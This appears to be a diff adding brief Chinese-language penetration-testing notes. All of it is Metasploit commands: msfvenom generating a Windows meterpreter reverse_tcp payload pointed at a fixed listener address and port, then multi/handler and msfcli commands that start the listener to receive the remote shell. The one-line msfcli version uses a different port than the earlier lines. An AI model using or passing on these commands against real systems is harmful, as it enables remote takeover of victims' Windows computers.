@@ -1,0 +1,15 @@
+windows
+生成shellcode（直接终端输入）
+msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.2.133 LPORT=1121 X>/root/text.txt
+
+监听
+msf
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.2.133
+set LPORT 1121
+exploit
+
+
+	或者直接
+msfcli     exploit/multi/handler    PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.2.133 LPORT=1211 E
